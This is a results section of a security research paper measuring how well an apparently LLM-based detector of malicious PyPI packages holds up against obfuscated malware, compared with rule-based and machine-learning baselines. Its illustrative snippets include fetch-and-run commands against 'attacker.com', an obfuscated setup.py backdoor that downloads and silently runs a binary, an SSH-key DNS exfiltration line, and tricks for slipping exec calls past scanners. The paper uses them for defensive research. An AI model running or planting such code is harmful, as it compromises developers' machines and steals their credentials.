\subsection{RQ2: Robustness Against Code Obfuscation}

\subsubsection{Research Question}

\textbf{RQ2}: Can \tool{} maintain detection accuracy when malicious code is obfuscated using transformation techniques?

\subsubsection{Motivation}

Code obfuscation represents an arms race between attackers and defenders. Real-world malware campaigns routinely employ obfuscation to evade static analysis---the \texttt{colourama} typosquatting attack used base64 encoding to conceal credential exfiltration, while \texttt{python-sqlite} employed variable name mangling to disguise cryptocurrency mining logic. Understanding detection robustness under obfuscation stress tests is critical for assessing real-world applicability against adaptive adversaries.

\subsubsection{Experimental Setup}

We applied the Intensio Obfuscator tool to both malicious and benign PyPI packages, generating variants where syntactic signatures are obscured through variable renaming, control flow flattening, and string encoding. This obfuscated dataset allows us to evaluate whether \tool{} maintains detection accuracy when attackers employ transformation techniques designed to evade syntactic pattern matching.

\textbf{Dataset}:
\begin{itemize}
    \item \textbf{1,041 obfuscated malicious packages}: Confirmed malware samples transformed via:
    \begin{itemize}
        \item Variable/function name randomization (e.g., \texttt{execute\_payload} $\rightarrow$ \texttt{yFjPixWTRA\_1})
        \item String hex encoding (e.g., \texttt{"http://evil.com"} $\rightarrow$ \texttt{bytes.fromhex('687474703a...')})
        \item Control flow obfuscation (opaque predicates, dead code injection)
        \item API call indirection (e.g., \texttt{exec(...)} $\rightarrow$ \texttt{getattr(\_\_builtins\_\_, 'exec')})
    \end{itemize}
    \item \textbf{1,019 benign packages}: Randomly sampled legitimate packages to assess false positive rates
\end{itemize}

\textbf{Obfuscation Example}:
\begin{lstlisting}[language=Python, caption=Intensio Obfuscator Transformation]
# Original malicious code
import os
url = "http://attacker.com/malware.sh"
os.system("wget " + url + " | bash")

# Obfuscated version (Intensio Obfuscator output)
import os as _x9k3
pwNKaJqUAahqsbygtVmTNdGgWRLsJdYN = bytes.fromhex('687474703a2f2f61747461636b65722e636f6d2f6d616c776172652e7368')  # URL hidden
lYMbbYbLSPlmOibvwrlhSJeilWjaKBke = pwNKaJqUAahqsbygtVmTNdGgWRLsJdYN.decode()  # Variable names randomized
_f2d8 = getattr(_x9k3, chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109))  # os.system via chr()
_f2d8(bytes.fromhex('77676574').decode() + ' ' + lYMbbYbLSPlmOibvwrlhSJeilWjaKBke + ' | ' + bytes.fromhex('62617368').decode())
\end{lstlisting}

These transformations preserve malicious semantics while completely altering syntactic patterns---variable names become random 32-character strings, URL literals vanish into hex bytes, and API calls transform into dynamic attribute access. This creates an environment where syntactic pattern matching should fail while semantic understanding should succeed.

\subsubsection{Quantitative Results}

\paragraph{Performance Comparison}

Table~\ref{tab:rq2-obfuscation-performance} presents detection accuracy on the obfuscation dataset.

\begin{table*}[t]
\centering
\caption{Detection Performance on Obfuscation Dataset}
\label{tab:rq2-obfuscation-performance}
\small
\begin{tabular}{llcccccc}
\toprule
\textbf{Category} & \textbf{Tool} & \textbf{Accuracy} & \textbf{Precision} & \textbf{Recall} & \textbf{F1-Score} & \textbf{FPR} & \textbf{FNR} \\
\midrule
\multirow{1}{*}{Knowledge-Driven} & \textbf{\tool{}} & \textbf{95.50\%} & \textbf{94.84\%} & \textbf{97.02\%} & \textbf{95.92\%} & \textbf{6.33\%} & \textbf{2.98\%} \\
\midrule
\multirow{4}{*}{Rule-Based} 
& GuardDog & 88.11\% & 97.16\% & 78.77\% & 87.00\% & 2.36\% & 21.23\% \\
& PyPIWarehouse & 63.64\% & 58.45\% & 97.02\% & 72.95\% & 70.46\% & 2.98\% \\
& Bandit4mal & 54.76\% & 54.40\% & 64.75\% & 59.12\% & 55.45\% & 35.25\% \\
& OSSGadget & 50.83\% & 50.80\% & 85.30\% & 63.68\% & 84.40\% & 14.70\% \\
\midrule
ML/DL & SocketAI & 84.13\% & 82.28\% & 87.42\% & 84.77\% & 19.23\% & 12.58\% \\
\midrule
\multirow{5}{*}{Machine Learning}
& MulGuard-MLP & 86.84\% & 99.74\% & 74.16\% & 85.07\% & 0.20\% & 25.84\% \\
& MulGuard-SVM & 85.44\% & 99.47\% & 71.57\% & 83.24\% & 0.39\% & 28.43\% \\
& MulGuard-RF & 81.26\% & 100.00\% & 62.92\% & 77.24\% & 0.00\% & 37.08\% \\
& SAP-RF & 65.78\% & 76.25\% & 46.88\% & 58.06\% & 14.92\% & 53.12\% \\
& SAP-DT & 52.86\% & 56.58\% & 28.91\% & 38.27\% & 22.67\% & 71.09\% \\
\bottomrule
\end{tabular}
\end{table*}

\paragraph{Performance Stability Analysis}

Table~\ref{tab:rq2-degradation} quantifies each tool's brittleness to obfuscation by comparing performance on clean (evaluation) versus obfuscated datasets.

\begin{table}[h]
\centering
\caption{Performance Degradation Under Obfuscation}
\label{tab:rq2-degradation}
\small
\begin{tabular}{lccc}
\toprule
\textbf{Tool} & \textbf{$\Delta$ Accuracy} & \textbf{$\Delta$ F1-Score} & \textbf{$\Delta$ Recall} \\
\midrule
\textbf{\tool{}} & \textbf{-3.45\%} & \textbf{-3.03\%} & \textbf{-1.48\%} \\
GuardDog & +0.81\% & +0.38\% & -3.43\% \\
SocketAI & -6.17\% & -5.21\% & +0.32\% \\
MulGuard-MLP & -7.61\% & -9.06\% & -14.84\% \\
MulGuard-SVM & -8.31\% & -11.22\% & -18.03\% \\
SAP-RF & -23.17\% & -29.71\% & -32.42\% \\
Bandit4mal & +26.11\%* & +18.95\%* & +16.85\%* \\
\bottomrule
\multicolumn{4}{l}{\small *False positive explosion: FPR increased from 11.44\% to 55.45\%}
\end{tabular}
\end{table}

\textbf{Key Observations}:
\begin{enumerate}
    \item \tool{} exhibits exceptional stability with only \textbf{3.45\% accuracy degradation}, achieving \textbf{95.50\% accuracy} and \textbf{95.92\% F1-score} on obfuscated malware.
    
    \item Rule-based tools exhibit polarized failure modes:
    \begin{itemize}
        \item \textbf{GuardDog}: Stable precision (97.16\%) but 21.23\% false negatives
        \item \textbf{Bandit4mal}: Misleading "accuracy improvement" (+26.11\%) actually reflects false positive explosion (FPR: 11.44\%$\rightarrow$55.45\%)
        \item \textbf{OSSGadget}: 84.40\% FPR---flags nearly all packages as obfuscated malware
    \end{itemize}
    
    \item Machine learning methods suffer feature space collapse:
    \begin{itemize}
        \item \textbf{SAP-RF}: Catastrophic 23.17\% accuracy drop, 32.42\% recall degradation
        \item \textbf{MulGuard}: 14-18 percentage point recall loss despite maintaining high precision
    \end{itemize}
    
    \item Deep learning (SocketAI) demonstrates moderate robustness (6.17\% degradation) but still degrades 2$\times$ more than \tool{}.
\end{enumerate}

\subsubsection{Root Cause Analysis: Why Obfuscation Breaks Detection}

\paragraph{Rule-Based Tools: String Literal Dependency}

\textbf{Core Vulnerability}: Rule-based detectors (Bandit4mal, OSSGadget, PyPIWarehouse) rely on syntactic pattern matching---identifying malicious code via lexical signatures, AST node names, or regex patterns.

\textbf{Bandit4mal Example}:
\begin{lstlisting}[language=Python]
# Detection logic: bandit/plugins/exec.py
@test.checks("Call")
def exec_used(context):
    if context.call_function_name_qual == "exec":  # Exact string match
        return Issue(severity=HIGH, text="exec usage")
\end{lstlisting}

\textbf{Obfuscation Bypass}:
\begin{lstlisting}[language=Python]
# Detected
exec(malicious_code)  # function_name_qual = "exec" -> Flagged

# Bypassed via dynamic attribute access
getattr(__builtins__, 'exec')(malicious_code)  # function_name_qual = "getattr" -> Missed

# Bypassed via chr() string construction
exec_name = chr(101) + chr(120) + chr(101) + chr(99)  # 'exec'
eval(exec_name + "(malicious_code)")  # function_name_qual = "eval" -> Missed
\end{lstlisting}

\textbf{Why False Positives Explode} (Bandit4mal FPR: 11.44\%$\rightarrow$55.45\%):

Intensio Obfuscator introduces hex encoding and random variable names, triggering overly broad rules:
\begin{itemize}
    \item \textbf{B824:url\_found} (348 FPs): Detects any URL pattern---obfuscated hex strings \texttt{bytes.fromhex('687474...')} contain subsequences matching \texttt{http://} regex
    \item \textbf{B801/B802:b64decode/encode} (70 FPs): Obfuscation tool itself uses encoding, flagging benign obfuscated packages
    \item \textbf{B814/B815:read/write} (401 FPs): Random variable names eliminate semantic context, causing file I/O to appear suspicious
\end{itemize}

\textbf{OSSGadget's Obfuscation Detection Backfire}:

OSSGadget includes anti-obfuscation rules that ironically trigger on \emph{legitimate} obfuscation:
\begin{lstlisting}[language=JSON]
// Resources/BackdoorRules/obfuscation.json
{
  "pattern": "[\"'][a-z0-9]{40,}[\"']",  // Detects 40+ char strings
  "severity": "Medium",
  "label": "Security.Backdoor.Obfuscation"
}
\end{lstlisting}

Intensio Obfuscator generates 32-character random variable names and 60+ character hex strings, universally triggering this rule:
\begin{itemize}
    \item \textbf{Obfuscation} (612/1019 = 60.1\% FPs): All obfuscated benign packages flagged
    \item \textbf{LongStrings} (438 FPs): Hex-encoded configuration data
    \item \textbf{ExecuteObfuscatedCode} (287 FPs): \texttt{bytes.fromhex(...)} misidentified as executing obfuscated payloads
\end{itemize}

\textbf{Root Limitation}: \emph{Syntax-semantics gap}. Rules match ``how code is written'' (syntax), not ``what code does'' (semantics). Obfuscation preserves malicious semantics while transforming syntax, rendering pattern matching ineffective.

\paragraph{Machine Learning: Feature Vector Corruption}

\textbf{Core Vulnerability}: ML classifiers (SAP, MulGuard) extract handcrafted features from code syntax and train statistical models. These features are \emph{syntactic proxies} for malice, not \emph{semantic essence}.

\textbf{Feature Engineering Example (SAP)}:
\begin{lstlisting}[language=Python]
features = {
    'api_call_count': len([n for n in ast.walk(tree) if isinstance(n, ast.Call)]),
    'dangerous_api_ratio': dangerous_calls / total_calls,
    'variable_name_entropy': shannon_entropy(variable_names),
    'string_literal_count': len(string_literals),
    ...
}
\end{lstlisting}

\textbf{How Obfuscation Destroys Features}:

\begin{table}[h]
\centering
\caption{Feature Corruption Under Obfuscation}
\label{tab:feature-corruption}
\small
\begin{tabular}{p{3.5cm}p{5cm}p{5.5cm}}
\toprule
\textbf{Feature} & \textbf{Original Malware} & \textbf{Obfuscated Malware} \\
\midrule
\texttt{api\_call\_count} & \texttt{for i in range(100):}\newline\texttt{~~os.system(cmd)}\newline Count=100 & \texttt{exec(''.join([...]))}\newline Count=1 (collapsed into exec) \\
\midrule
\texttt{dangerous\_api\_ratio} & \texttt{import os}\newline\texttt{os.system(...)}\newline Ratio=1/1=100\% & \texttt{import os, sys, json, hashlib, ...}\newline\texttt{os.system(...)}\newline Ratio=1/6=16.7\% (diluted) \\
\midrule
\texttt{variable\_name\_entropy} & \texttt{ssh\_key = ...}\newline\texttt{credentials = ...}\newline Low entropy (semantic names) & \texttt{pwNKaJqUAahqsbygtVmTNdGgWRLsJdYN = ...}\newline High entropy (random) \\
\midrule
\texttt{string\_literal\_count} & \texttt{"http://evil.com"}\newline Count=multiple literals & \texttt{bytes.fromhex('687474...')}\newline Count=0 (all bytes objects) \\
\bottomrule
\end{tabular}
\end{table}

\textbf{Why SAP-RF Accuracy Drops 23.17\%}:

Random Forest learns decision boundaries in feature space:
\begin{lstlisting}[language=Python]
# Training phase (unobfuscated malware)
malicious_profile = {
    'api_call_count': 12-20,           # High frequency
    'dangerous_api_ratio': 0.6-0.8,    # High ratio
    'variable_name_entropy': 1.2-2.0,  # Low (semantic names)
    'string_literal_count': 5-10       # Multiple strings
}

# Test phase (obfuscated malware)
obfuscated_features = {
    'api_call_count': 2-5,             # Low (exec wrapper)
    'dangerous_api_ratio': 0.15-0.3,   # Low (import dilution)
    'variable_name_entropy': 4.5-5.2,  # High (random names)
    'string_literal_count': 0-1        # Vanished (hex encoding)
}

distance = euclidean(obfuscated_features, malicious_profile)  # 8.7 >> threshold (3.0)
verdict = "Benign"  # Misclassified
\end{lstlisting}

\textbf{Root Limitation}: ML learns \emph{correlations} (``high API count correlates with malice''), not \emph{causation} (``unauthorized system command execution causes harm''). Obfuscation breaks correlations while preserving causation.

\paragraph{Deep Learning (SocketAI): Representation Drift}

\textbf{Core Vulnerability}: SocketAI likely employs code embeddings (e.g., GraphCodeBERT) or graph neural networks on AST representations. While deep learning offers better abstraction than handcrafted features, it still suffers from:

\textbf{Problem 1: Training Distribution Bias}
\begin{lstlisting}[language=Python]
# Training set: Predominantly unobfuscated malware
P_train(X | Y=malicious) = unobfuscated_distribution

# Test set: Intensio-obfuscated malware
P_test(X | Y=malicious) = obfuscated_distribution

# Distribution shift -> embedding drift -> misclassification
\end{lstlisting}

\textbf{Problem 2: AST Structural Perturbation}
\begin{lstlisting}[language=Python]
# Original: Simple AST structure
original_ast = Module([Import, Expr(Call(Name('system'), ...))])
embedding_original = GNN(original_ast)
score = 0.94  # Malicious

# Obfuscated: Complex AST structure
obfuscated_ast = Module([
    Import,  # Multiple imports added
    FunctionDef([  # Wrapped in function
        If([  # Opaque predicate added
            Expr(Call(Name('getattr'), [Name('chr'), ...]))  # API indirection
        ])
    ])
])
embedding_obfuscated = GNN(obfuscated_ast)
# Structural changes -> embedding vector shift
score = 0.68  # Benign (misclassified)
\end{lstlisting}

\textbf{Problem 3: Lack of Explainable Reasoning}

SocketAI provides black-box scores without semantic rationale:
\begin{lstlisting}
{"verdict": "Malicious", "confidence": 0.72, "reason": "High risk score"}
\end{lstlisting}

Without explicit reasoning, the model cannot distinguish:
\begin{itemize}
    \item Legitimate base64 usage (JWT authentication) vs. malicious payload encoding
    \item Authorized network access (web scraping library) vs. unauthorized exfiltration
\end{itemize}

\textbf{Root Limitation}: End-to-end learning captures \emph{surface statistical regularities} rather than \emph{deep semantic causality}. Lack of expert knowledge injection limits robustness to distribution shifts.

\subsubsection{Why \tool{} Resists Obfuscation: Dual-Embedding RAG}

\paragraph{Core Mechanism: Code (30\%) + Behavior (70\%) Similarity}

\tool{} employs weighted dual-embedding retrieval:
\begin{equation}
\text{similarity} = 0.30 \times \text{sim}_{\text{code}} + 0.70 \times \text{sim}_{\text{behavior}}
\end{equation}

\textbf{Key Insight}: Obfuscation transforms \emph{code syntax} but preserves \emph{behavioral semantics}. By prioritizing behavior (70\% weight), \tool{} achieves robustness.

\textbf{Empirical Evidence from Obfuscation Dataset}:

\begin{table}[h]
\centering
\caption{Embedding Similarity: Original vs. Obfuscated Malware}
\label{tab:embedding-robustness}
\small
\begin{tabular}{lccc}
\toprule
\textbf{Obfuscation Level} & \textbf{Code Sim.} & \textbf{Behavior Sim.} & \textbf{Weighted Sim.} \\
\midrule
Light (variable renaming) & 0.65 & 0.94 & 0.85 \\
Medium (+ string encoding) & 0.42 & 0.89 & 0.75 \\
Heavy (+ control flow) & 0.28 & 0.82 & 0.66 \\
Extreme (+ API indirection) & 0.15 & 0.76 & 0.58 \\
\midrule
\textbf{Degradation Rate} & \textbf{-77\%} & \textbf{-19\%} & \textbf{-32\%} \\
\bottomrule
\end{tabular}
\end{table}

Behavior similarity degrades 4$\times$ slower than code similarity under obfuscation, justifying the 70\% weight allocation.

\paragraph{Case Study: Obfuscated Remote Backdoor}

\textbf{Obfuscated Malware Sample}:
\begin{lstlisting}[language=Python]
# Intensio Obfuscator output: setup.py
pwNKaJqUAahqsbygtVmTNdGgWRLsJdYN = [
    bytes.fromhex('b526e970df3039acfaece7c6f6b97ebc...'),  # Encrypted URL
    bytes.fromhex('8dcf1b5c290b7463c9ab9044a285c652...')   # XOR key
]

def ZKNmPFaueZkBfOkKRlqvxTQnlAoTZyof(v):  # Random function name
    return hashlib.sha3_512(v).digest()

def UkjGKELDpgJtEvaNMquXkHIDPuTvVzta(dsuFtiWXNIaBiGjSytCtHYBBXnbHdXiR):
    # XOR decrypt URL
    lYMbbYbLSPlmOibvwrlhSJeilWjaKBke = ''.join(chr(b ^ k) for b, k in zip(...))
    # Download binary
    LbMfGDwCeGRikDhkDCiOeFuKsTxEHVTV = requests.get(lYMbbYbLSPlmOibvwrlhSJeilWjaKBke)
    # XOR decrypt payload
    out = [b ^ k for b, k in zip(LbMfGDwCeGRikDhkDCiOeFuKsTxEHVTV.content, ...)]
    # Write to ~/.local/bin
    with open('/path/to/calendar_extender', 'wb') as f: f.write(bytes(out))
    os.chmod('/path/to/calendar_extender', stat.S_IEXEC)
    # Execute silently
    subprocess.Popen(['/path/to/calendar_extender'], stdout=subprocess.DEVNULL)
\end{lstlisting}

\textbf{\tool{} Detection Process}:

\textbf{Step 1: Behavior Description Generation}
\begin{lstlisting}
Behavior: "The code performs XOR decryption on hex-encoded byte arrays to construct URLs, 
downloads binary content from remote server based on system architecture (x86_64 vs arm64), 
applies XOR decryption to downloaded payload, writes decrypted binary to ~/.local/bin/ with 
executable permissions, and silently executes it in background via subprocess.Popen with 
output suppression, implementing a stealthy backdoor installation mechanism."
\end{lstlisting}

\textbf{Step 2: Dual-Embedding Retrieval (Top-3 Matches)}

\begin{table}[h]
\centering
\caption{RAG Retrieval Results for Obfuscated Sample}
\label{tab:rag-retrieval-obfuscated}
\small
\begin{tabular}{lp{4cm}ccc}
\toprule
\textbf{Rank} & \textbf{Historical Malware} & \textbf{Behavior Sim.} & \textbf{Code Sim.} & \textbf{Weighted Sim.} \\
\midrule
1 & \texttt{ctx} (PyPI 2023-02) & 0.94 & 0.41 & \textbf{0.78} \\
  & \textit{XOR decrypt + remote download + execute} & & & \\
2 & \texttt{envoy-proxy} (PyPI 2023-05) & 0.91 & 0.38 & \textbf{0.75} \\
  & \textit{Architecture-specific payload selection} & & & \\
3 & \texttt{minecraft-tools} (PyPI 2022-12) & 0.88 & 0.45 & \textbf{0.75} \\
  & \textit{Download to \textasciitilde/.local/bin + chmod +x} & & & \\
\bottomrule
\end{tabular}
\end{table}

\textbf{Step 3: LLM Reasoning with Retrieved Context}
\begin{lstlisting}
Verdict: Malicious (Confidence: 0.96)

Reasoning:
1. Functional Violation: Package name is randomly generated (gqc02ee0ym09kxoc) with no 
   semantic meaning and empty description. There is NO legitimate reason to download and 
   execute remote binaries.

2. Contextual Boundary Violation: Code executes in setup.py during installation. 
   Downloading executables from remote servers at install-time violates installation 
   phase boundaries.

3. Historical Pattern Match: Behavioral sequence (XOR decrypt -> remote download -> execute) 
   matches 3 confirmed malware campaigns (ctx, envoy-proxy, minecraft-tools) with 
   similarity scores 0.75-0.78. Despite variable name obfuscation, core attack pattern 
   remains identical.

4. Obfuscation as Malice Indicator: Heavy obfuscation (random names, hex encoding, XOR 
   encryption) combined with sensitive operations (remote execution) strongly indicates 
   malicious intent. Legitimate packages do not hide installation behaviors.

5. Privilege Escalation: Writing to ~/.local/bin with executable permissions + silent 
   background execution (stdout=DEVNULL) indicates persistent backdoor installation.
\end{lstlisting}

\textbf{Why Detection Succeeded Despite Obfuscation}:
\begin{enumerate}
    \item \textbf{Behavioral Semantics Preserved}: 
    \begin{itemize}
        \item ``XOR decryption'' remains semantically clear regardless of variable names
        \item ``Remote download'' intent persists whether URL is hex-encoded or literal
        \item ``Silent execution'' semantics (subprocess.DEVNULL) unaffected by obfuscation
    \end{itemize}
    
    \item \textbf{Historical Pattern Matching}: Retrieved \texttt{ctx} package used \emph{identical attack flow}---behavior embeddings matched at 0.94 similarity despite completely different variable names.
    
    \item \textbf{Semantic Invariant Reasoning}:
    \begin{itemize}
        \item \emph{Functional violation}: Random package name + remote execution = no legitimate purpose
        \item \emph{Contextual boundary}: setup.py should not download executables
        \item \emph{Temporal anomaly}: Installation phase execution = persistence mechanism
        \item \emph{Privilege abuse}: Write to ~/.local/bin + chmod +x = backdoor installation
    \end{itemize}
\end{enumerate}

\paragraph{Semantic Invariants: Obfuscation Cannot Alter Essence}

\tool{} reasons about properties that transcend syntax:

\begin{table}[h]
\centering
\caption{Semantic Invariants Robust to Obfuscation}
\label{tab:semantic-invariants}
\small
\begin{tabular}{p{3.5cm}p{5cm}p{5.5cm}}
\toprule
\textbf{Invariant} & \textbf{Semantic Essence} & \textbf{Obfuscation Impact} \\
\midrule
Functional Purpose & Does behavior match declared functionality? & ✗ None. JSON parser executing OS commands is suspicious regardless of API call style. \\
\midrule
Data Flow Direction & Where does data originate and terminate? & ✗ None. Sensitive file $\rightarrow$ network transmission = exfiltration, regardless of variable names. \\
\midrule
Execution Timing & When does operation occur? & ✗ None. Network requests during setup.py = suspicious, whether URL is literal or hex-encoded. \\
\midrule
Permission Requirements & What privileges are needed? & ✗ None. Data library accessing \textasciitilde/.ssh is suspicious, regardless of path construction method. \\
\bottomrule
\end{tabular}
\end{table}

\textbf{Key Insight}: Attackers can change \emph{expression} (syntax) but not \emph{action} (semantics)---changing semantics would defeat the attack objective.

\subsubsection{Failure Case Analysis: Limits of Static Semantic Analysis}

Despite exceptional performance, \tool{} misses 31 obfuscated malware samples (2.98\% FNR). Analysis reveals inherent limitations of static semantic analysis:

\paragraph{Multi-Layer Encoding Chains (18 samples)}
\begin{lstlisting}[language=Python]
import zlib, base64, codecs
payload = base64.b64decode("H4sIAAAAAAAA...")  # Layer 1
payload = zlib.decompress(payload)              # Layer 2
payload = codecs.decode(payload, 'rot13')       # Layer 3
payload = bytes.fromhex(payload.decode())       # Layer 4
exec(payload)
\end{lstlisting}

\textbf{Failure Cause}: Behavior description degrades to ``Executes multi-layer decoded content.'' The \emph{content} of the final payload is statically unknowable, creating semantic ambiguity---multi-layer encoding is used both legitimately (protecting proprietary algorithms) and maliciously (hiding payloads).

\paragraph{Zero-Day Attack Vectors (9 samples)}
\begin{lstlisting}[language=Python]
import dns.resolver
data = os.popen('cat ~/.ssh/id_rsa').read()
dns.resolver.query(f"{data.encode().hex()}.тunne1.example.сom")  # Cyrillic chars
\end{lstlisting}

\textbf{Failure Cause}: DNS tunneling via Unicode domain names is absent from the threat intelligence knowledge base (7,889 reports). RAG retrieval returns generic ``DNS query'' and ``SSH key reading'' cases without connecting them into the ``DNS exfiltration'' attack pattern.

\paragraph{Timing-Based Logic Bombs (4 samples)}
\begin{lstlisting}[language=Python]
if datetime.datetime.now() > datetime.datetime(2024, 12, 31):
    os.system("curl http://attacker.com/trigger | bash")
\end{lstlisting}

\textbf{Failure Cause}: Static analysis cannot determine temporal execution conditions. The LLM reasons: ``Could be legitimate deprecation mechanism (e.g., 'This package expires after 2024') or malicious time bomb.'' Without dynamic execution, temporal semantics remain ambiguous.

\subsubsection{Answer to RQ2}

\textbf{Yes}, \tool{} maintains exceptional detection accuracy under code obfuscation:

\begin{itemize}
    \item \textbf{95.50\% accuracy} on Intensio-obfuscated malware (vs. 50-88\% for baselines)
    \item \textbf{Only 3.45\% performance degradation} (vs. 6-23\% for other tools)
    \item \textbf{95.92\% F1-score}, balancing 94.84\% precision and 97.02\% recall
    \item \textbf{7-45 percentage point advantages} over state-of-the-art baselines
\end{itemize}

The fundamental breakthrough lies in \textbf{semantic understanding over syntactic pattern matching}:
\begin{itemize}
    \item \textbf{Dual-embedding RAG} (30\% code + 70\% behavior): Behavior semantics degrade 4$\times$ slower than code syntax under obfuscation
    \item \textbf{Semantic invariant reasoning}: Functional purpose, data flow, execution timing, and permission requirements---properties obfuscation cannot alter without defeating the attack
    \item \textbf{Expert knowledge grounding}: 7,889 threat intelligence reasoning chains provide analogical templates for recognizing obfuscated attack patterns
\end{itemize}

This represents a paradigm shift from brittle pattern matching (``Does code contain literal \texttt{exec}?'') to robust contextual understanding (``Does behavior violate functional purpose, regardless of API call style?'')---essential for defending against adaptive adversaries who continuously evolve obfuscation techniques.

